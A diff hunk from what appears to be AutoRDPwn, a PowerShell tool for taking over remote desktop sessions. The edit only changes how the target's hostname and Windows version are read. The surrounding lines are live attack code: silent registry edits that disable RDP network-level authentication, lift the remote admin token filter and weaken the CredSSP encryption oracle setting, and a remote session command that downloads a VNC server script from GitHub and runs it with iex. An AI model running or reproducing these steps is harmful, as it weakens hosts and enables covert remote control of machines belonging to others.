@@ -577,9 +577,9 @@ if($Language -in 'Spanish') {
     REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f 2>&1> $null
     REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f 2>&1> $null }
     REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters" /v AllowEncryptionOracle /t REG_DWORD /d 2 /f 2>&1> $null
-    Write-Host ; Write-Host "$txt32" -ForegroundColor Blue ; $hostname = invoke-command -session $RDP[0] -scriptblock {(systeminfo | findstr /I "host" | select -First 1).split(':')[1].trim()}
+    Write-Host ; Write-Host "$txt32" -ForegroundColor Blue ; $hostname = invoke-command -session $RDP[0] -scriptblock { $env:computername }
     Write-Host ; Write-Host "$txt33" -NoNewLine ; Write-Host $hostname.tolower() -ForegroundColor Gray
-    $version = invoke-command -session $RDP[0] -scriptblock {(systeminfo | findstr "Microsoft Windows" | select -First 1).split(':')[1].trim()} ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
+    $version = invoke-command -session $RDP[0] -scriptblock { (Get-WmiObject -class Win32_OperatingSystem).Caption } ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
 
     if($vncserver){ invoke-command -session $RDP[0] -scriptblock {
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-VNCServer.ps1" -UseBasicParsing | iex }}
